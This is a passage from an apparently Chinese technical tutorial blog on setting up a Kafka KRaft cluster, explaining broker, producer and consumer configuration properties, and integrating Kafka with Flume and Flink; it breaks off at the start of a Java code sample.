class="line">listener.security.protocol.map=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT,SSL:SSL,SASL_PLAINTEXT:SASL_PLAINTEXT,SASL_SSL:SASL_SSL</span><br><span class="line"><span class="comment">#kafka 数据存储目录</span></span><br><span class="line">log.dirs=/opt/module/kafka2/data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发 kafka2</span></span><br><span class="line">xsync kafka2/</span><br><span class="line"><span class="comment"># 在 hadoop103 和 hadoop104 上 需 要 对 node.id 相应改变 ， 值 需 要 和controller.quorum.voters 对应</span></span><br><span class="line"><span class="comment"># 在 hadoop103 和 hadoop104 上需要 根据各自的主机名称，修改相应的advertised.Listeners 地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化集群数据目录</span></span><br><span class="line"><span class="comment"># 首先生成存储目录唯一 ID</span></span><br><span class="line">bin/kafka-storage.sh random-uuid</span><br><span class="line"><span class="comment"># 用该 ID 格式化 kafka 存储目录（三台节点），随机数是上面生产的</span></span><br><span class="line">bin/kafka-storage.sh format -t J7s9e8PPTKOO47PxzI39VA -c /opt/module/kafka2/config/kraft/server.properties</span><br><span class="line"><span class="comment"># 启动 kafka 集群，三台都要启动</span></span><br><span class="line">bin/kafka-server-start.sh -daemon config/kraft/server.properties</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止 kafka 集群</span></span><br><span class="line">bin/kafka-server-stop.sh</span><br></pre></td></tr></table></figure><h3 id="5-3-Kafka-Kraft-集群启动停止脚本">5.3 Kafka-Kraft 集群启动停止脚本</h3><p>在/home/atguigu/bin 目录下创建文件 <a href="http://kf2.sh" target="_blank" rel="noopener">kf2.sh</a> 脚本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)&#123;</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" --------启动 <span class="variable">$i</span> Kafka2-------"</span></span><br><span class="line">    ssh <span class="variable">$i</span> <span class="string">"/opt/module/kafka2/bin/kafka-server-start.sh -</span></span><br><span class="line"><span class="string">    daemon /opt/module/kafka2/config/kraft/server.properties"</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"stop"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" --------停止 <span class="variable">$i</span> Kafka2-------"</span></span><br><span class="line">    ssh <span class="variable">$i</span> <span class="string">"/opt/module/kafka2/bin/kafka-server-stop.sh "</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加执行权限</span></span><br><span class="line">chmod +x kf2.sh</span><br><span class="line">kf2.sh start</span><br><span class="line">kf2.sh stop</span><br></pre></td></tr></table></figure><h2 id="6、Kafka配置文件说明">6、Kafka配置文件说明</h2><h3 id="6-1-Server-properties配置文件说明">6.1 Server.properties配置文件说明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#broker的全局唯一编号，不能重复</span></span><br><span class="line">broker.id=0</span><br><span class="line"></span><br><span class="line"><span class="comment">#用来监听链接的端口，producer或consumer将在此端口建立连接</span></span><br><span class="line">port=9092</span><br><span class="line"></span><br><span class="line"><span class="comment">#处理网络请求的线程数量</span></span><br><span class="line">num.network.threads=3</span><br><span class="line"></span><br><span class="line"><span class="comment">#用来处理磁盘IO的线程数量</span></span><br><span class="line">num.io.threads=8</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送套接字的缓冲区大小</span></span><br><span class="line">socket.send.buffer.bytes=102400</span><br><span class="line"></span><br><span class="line"><span class="comment">#接受套接字的缓冲区大小</span></span><br><span class="line">socket.receive.buffer.bytes=102400</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求套接字的缓冲区大小</span></span><br><span class="line">socket.request.max.bytes=104857600</span><br><span class="line"></span><br><span class="line"><span class="comment">#kafka运行日志存放的路径</span></span><br><span class="line">log.dirs=/<span class="built_in">export</span>/data/kafka/</span><br><span class="line"></span><br><span class="line"><span class="comment">#topic在当前broker上的分片个数</span></span><br><span class="line">num.partitions=2</span><br><span class="line"></span><br><span class="line"><span class="comment">#用来恢复和清理data下数据的线程数量</span></span><br><span class="line">num.recovery.threads.per.data.dir=1</span><br><span class="line"></span><br><span class="line"><span class="comment">#segment文件保留的最长时间，超时将被删除</span></span><br><span class="line">log.retention.hours=168</span><br><span class="line"></span><br><span class="line"><span class="comment">#滚动生成新的segment文件的最大时间</span></span><br><span class="line">log.roll.hours=1</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志文件中每个segment的大小，默认为1G</span></span><br><span class="line">log.segment.bytes=1073741824</span><br><span class="line"></span><br><span class="line"><span class="comment">#周期性检查文件大小的时间</span></span><br><span class="line">log.retention.check.interval.ms=300000</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志清理是否打开</span></span><br><span class="line">log.cleaner.enable=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#broker需要使用zookeeper保存meta数据</span></span><br><span class="line">zookeeper.connect=zk01:2181,zk02:2181,zk03:2181</span><br><span class="line"></span><br><span class="line"><span class="comment">#zookeeper链接超时时间</span></span><br><span class="line">zookeeper.connection.timeout.ms=6000</span><br><span class="line"></span><br><span class="line"><span class="comment">#partion buffer中，消息的条数达到阈值，将触发flush到磁盘</span></span><br><span class="line">log.flush.interval.messages=10000</span><br><span class="line"></span><br><span class="line"><span class="comment">#消息buffer的时间，达到阈值，将触发flush到磁盘</span></span><br><span class="line">log.flush.interval.ms=3000</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除topic需要server.properties中设置delete.topic.enable=true否则只是标记删除</span></span><br><span class="line">delete.topic.enable=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此处的host.name为本机IP(重要),如果不改,则客户端会抛出:Producer connection to localhost:9092 unsuccessful 错误!</span></span><br><span class="line">host.name=kafka01</span><br><span class="line"></span><br><span class="line">advertised.host.name=192.168.140.128</span><br><span class="line"></span><br><span class="line"><span class="comment"># producer生产者配置文件说明</span></span><br><span class="line"><span class="comment">#指定kafka节点列表，用于获取metadata，不必全部指定</span></span><br><span class="line">metadata.broker.list=node01:9092,node02:9092,node03:9092</span><br><span class="line"><span class="comment"># 指定分区处理类。默认kafka.producer.DefaultPartitioner，表通过key哈希到对应分区</span></span><br><span class="line"><span class="comment">#partitioner.class=kafka.producer.DefaultPartitioner</span></span><br><span class="line"><span class="comment"># 是否压缩，默认0表示不压缩，1表示用gzip压缩，2表示用snappy压缩。压缩后消息中会有头来指明消息压缩类型，故在消费者端消息解压是透明的无需指定。</span></span><br><span class="line">compression.codec=none</span><br><span class="line"><span class="comment"># 指定序列化处理类</span></span><br><span class="line">serializer.class=kafka.serializer.DefaultEncoder</span><br><span class="line"><span class="comment"># 如果要压缩消息，这里指定哪些topic要压缩消息，默认empty，表示不压缩。</span></span><br><span class="line"><span class="comment">#compressed.topics=</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置发送数据是否需要服务端的反馈,有三个值0,1,-1</span></span><br><span class="line"><span class="comment"># 0: producer不会等待broker发送ack </span></span><br><span class="line"><span class="comment"># 1: 当leader接收到消息之后发送ack </span></span><br><span class="line"><span class="comment"># -1: 当所有的follower都同步消息成功后发送ack. </span></span><br><span class="line">request.required.acks=0 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 在向producer发送ack之前,broker允许等待的最大时间 ，如果超时,broker将会向producer发送一个error ACK.意味着上一次消息因为某种原因未能成功(比如follower未能同步成功) </span></span><br><span class="line">request.timeout.ms=10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步还是异步发送消息，默认“sync”表同步，"async"表异步。异步可以提高发送吞吐量,</span></span><br><span class="line"><span class="comment"># 也意味着消息将会在本地buffer中,并适时批量发送，但是也可能导致丢失未发送过去的消息</span></span><br><span class="line">producer.type=sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在async模式下,当message被缓存的时间超过此值后,将会批量发送给broker,默认为5000ms</span></span><br><span class="line"><span class="comment"># 此值和batch.num.messages协同工作.</span></span><br><span class="line">queue.buffering.max.ms = 5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在async模式下,producer端允许buffer的最大消息量</span></span><br><span class="line"><span class="comment"># 无论如何,producer都无法尽快的将消息发送给broker,从而导致消息在producer端大量沉积</span></span><br><span class="line"><span class="comment"># 此时,如果消息的条数达到阀值,将会导致producer端阻塞或者消息被抛弃，默认为10000</span></span><br><span class="line">queue.buffering.max.messages=20000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果是异步，指定每次批量发送数据量，默认为200</span></span><br><span class="line">batch.num.messages=500</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当消息在producer端沉积的条数达到"queue.buffering.max.meesages"后 </span></span><br><span class="line"><span class="comment"># 阻塞一定时间后,队列仍然没有enqueue(producer仍然没有发送出任何消息) </span></span><br><span class="line"><span class="comment"># 此时producer可以继续阻塞或者将消息抛弃,此timeout值用于控制"阻塞"的时间 </span></span><br><span class="line"><span class="comment"># -1: 无阻塞超时限制,消息不会被抛弃 </span></span><br><span class="line"><span class="comment"># 0:立即清空队列,消息被抛弃 </span></span><br><span class="line">queue.enqueue.timeout.ms=-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当producer接收到error ACK,或者没有接收到ACK时,允许消息重发的次数 </span></span><br><span class="line"><span class="comment"># 因为broker并没有完整的机制来避免消息重复,所以当网络异常时(比如ACK丢失) </span></span><br><span class="line"><span class="comment"># 有可能导致broker接收到重复的消息,默认值为3.</span></span><br><span class="line">message.send.max.retries=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># producer刷新topic metada的时间间隔,producer需要知道partition leader的位置,以及当前topic的情况 </span></span><br><span class="line"><span class="comment"># 因此producer需要一个机制来获取最新的metadata,当producer遇到特定错误时,将会立即刷新 </span></span><br><span class="line"><span class="comment"># (比如topic失效,partition丢失,leader失效等),此外也可以通过此参数来配置额外的刷新机制，默认值600000 </span></span><br><span class="line">topic.metadata.refresh.interval.ms=60000</span><br></pre></td></tr></table></figure><h3 id="6-2-consumer消费者配置详细说明">6.2 consumer消费者配置详细说明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zookeeper连接服务器地址</span></span><br><span class="line">zookeeper.connect=zk01:2181,zk02:2181,zk03:2181</span><br><span class="line"><span class="comment"># zookeeper的session过期时间，默认5000ms，用于检测消费者是否挂掉</span></span><br><span class="line">zookeeper.session.timeout.ms=5000</span><br><span class="line"><span class="comment">#当消费者挂掉，其他消费者要等该指定时间才能检查到并且触发重新负载均衡</span></span><br><span class="line">zookeeper.connection.timeout.ms=10000</span><br><span class="line"><span class="comment"># 指定多久消费者更新offset到zookeeper中。注意offset更新时基于time而不是每次获得的消息。一旦在更新zookeeper发生异常并重启，将可能拿到已拿到过的消息</span></span><br><span class="line">zookeeper.sync.time.ms=2000</span><br><span class="line"><span class="comment">#指定消费 </span></span><br><span class="line">group.id=itcast</span><br><span class="line"><span class="comment"># 当consumer消费一定量的消息之后,将会自动向zookeeper提交offset信息 </span></span><br><span class="line"><span class="comment"># 注意offset信息并不是每消费一次消息就向zk提交一次,而是现在本地保存(内存),并定期提交,默认为true</span></span><br><span class="line">auto.commit.enable=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 自动更新时间。默认60 * 1000</span></span><br><span class="line">auto.commit.interval.ms=1000</span><br><span class="line"><span class="comment"># 当前consumer的标识,可以设定,也可以有系统生成,主要用来跟踪消息消费情况,便于观察</span></span><br><span class="line">conusmer.id=xxx </span><br><span class="line"><span class="comment"># 消费者客户端编号，用于区分不同客户端，默认客户端程序自动产生</span></span><br><span class="line">client.id=xxxx</span><br><span class="line"><span class="comment"># 最大取多少块缓存到消费者(默认10)</span></span><br><span class="line">queued.max.message.chunks=50</span><br><span class="line"><span class="comment"># 当有新的consumer加入到group时,将会reblance,此后将会有partitions的消费端迁移到新  的consumer上,如果一个consumer获得了某个partition的消费权限,那么它将会向zk注册 "Partition Owner registry"节点信息,但是有可能此时旧的consumer尚没有释放此节点, 此值用于控制,注册节点的重试次数. </span></span><br><span class="line">rebalance.max.retries=5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取消息的最大尺寸,broker不会像consumer输出大于此值的消息chunk 每次feth将得到多条消息,此值为总大小,提升此值,将会消耗更多的consumer端内存</span></span><br><span class="line">fetch.min.bytes=6553600</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当消息的尺寸不足时,server阻塞的时间,如果超时,消息将立即发送给consumer</span></span><br><span class="line">fetch.wait.max.ms=5000</span><br><span class="line">socket.receive.buffer.bytes=655360</span><br><span class="line"><span class="comment"># 如果zookeeper没有offset值或offset值超出范围。那么就给个初始的offset。有smallest、largest、anything可选，分别表示给当前最小的offset、当前最大的offset、抛异常。默认largest</span></span><br><span class="line">auto.offset.reset=smallest</span><br><span class="line"><span class="comment"># 指定序列化处理类</span></span><br><span class="line">derializer.class=kafka.serializer.DefaultDecoder</span><br></pre></td></tr></table></figure><h1>三、Kafka外部系统集成</h1><h2 id="1、集成-Flume">1、集成 Flume</h2><h3 id="1-1-Flume生产者">1.1 Flume生产者</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335713.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 kafka 集群</span></span><br><span class="line">zk.sh start</span><br><span class="line">kf.sh start</span><br><span class="line"><span class="comment"># 启动 kafka 消费者,这里我使用first的topic</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic first</span><br><span class="line"><span class="comment"># 安装好flume，具体详见之前的笔记Flume1.9基础学习</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始配置flume生产者</span></span><br><span class="line"><span class="comment"># 在 hadoop102 节点的 Flume 的 job 目录下创建 file_to_kafka.conf</span></span><br><span class="line">mkdir <span class="built_in">jobs</span></span><br><span class="line">vim <span class="built_in">jobs</span>/file_to_kafka.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 组件定义</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"><span class="comment"># 2 配置 source</span></span><br><span class="line">a1.sources.r1.type = TAILDIR</span><br><span class="line">a1.sources.r1.filegroups = f1</span><br><span class="line">a1.sources.r1.filegroups.f1 = /opt/module/applog/app.*</span><br><span class="line">a1.sources.r1.positionFile = /opt/module/flume/taildir_position.json</span><br><span class="line"><span class="comment"># 3 配置 channel</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># 4 配置 sink</span></span><br><span class="line">a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink</span><br><span class="line">a1.sinks.k1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092</span><br><span class="line">a1.sinks.k1.kafka.topic = first</span><br><span class="line">a1.sinks.k1.kafka.flumeBatchSize = 20</span><br><span class="line">a1.sinks.k1.kafka.producer.acks = 1</span><br><span class="line">a1.sinks.k1.kafka.producer.linger.ms = 1</span><br><span class="line"><span class="comment"># 5 拼接组件</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Flume</span></span><br><span class="line">bin/flume-ng agent -c conf/ -n a1 -f <span class="built_in">jobs</span>/file_to_kafka.conf &amp;</span><br><span class="line"><span class="comment"># 向/opt/module/applog/app.log 里追加数据，查看 kafka 消费者消费情况</span></span><br><span class="line">mkdir applog</span><br><span class="line"><span class="built_in">echo</span> hello &gt;&gt; /opt/module/applog/app.log</span><br><span class="line"><span class="comment"># 观察 kafka 消费者，能够看到消费的 hello 数据</span></span><br></pre></td></tr></table></figure><h3 id="1-2-Flume-消费者">1.2 Flume 消费者</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取kafka消息到控制台</span></span><br><span class="line"><span class="comment"># 在 hadoop102 节点的 Flume 的/opt/module/flume/jobs 目录下创建 kafka_to_file.conf</span></span><br><span class="line">vim kafka_to_file.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 组件定义</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"><span class="comment"># 2 配置 source</span></span><br><span class="line">a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource</span><br><span class="line">a1.sources.r1.batchSize = 50</span><br><span class="line">a1.sources.r1.batchDurationMillis = 200</span><br><span class="line">a1.sources.r1.kafka.bootstrap.servers = hadoop102:9092</span><br><span class="line">a1.sources.r1.kafka.topics = first</span><br><span class="line">a1.sources.r1.kafka.consumer.group.id = custom.g.id</span><br><span class="line"><span class="comment"># 3 配置 channel</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># 4 配置 sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"><span class="comment"># 5 拼接组件</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Flume</span></span><br><span class="line">bin/flume-ng agent -c conf/ -n a1 -f <span class="built_in">jobs</span>/kafka_to_file.conf -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># 启动 kafka 生产者</span></span><br><span class="line">bin/kafka-console-producer.sh --bootstrap-server hadoop102:9092 --topic first</span><br></pre></td></tr></table></figure><h2 id="2、集成-Flink">2、集成 Flink</h2><p>Flink 是一个在大数据开发中非常常用的组件。可以用于 Kafka 的生产者，也可以用于Flink 的消费者。首先创建maven项目</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-java_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将 log4j.properties 文件添加到 resources 里面，就能更改打印日志的级别为 error</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">log4j.rootLogger&#x3D;error, stdout,R</span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p --- [%50t] %-80c(line:%5L) : %m%n</span><br><span class="line"></span><br><span class="line">log4j.appender.R&#x3D;org.apache.log4j.RollingFileAppender</span><br><span class="line">log4j.appender.R.File&#x3D;..&#x2F;log&#x2F;agent.log</span><br><span class="line">log4j.appender.R.MaxFileSize&#x3D;1024KB</span><br><span class="line">log4j.appender.R.MaxBackupIndex&#x3D;1</span><br><span class="line"></span><br><span class="line">log4j.appender.R.layout&#x3D;org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.R.layout.ConversionPattern&#x3D;%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p --- [%50t] %-80c(line:%6L) : %m%n</span><br></pre></td></tr></table></figure><p>在 java 文件夹下创建包名为 com.atguigu.flink，首先是测试flink生产者代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span 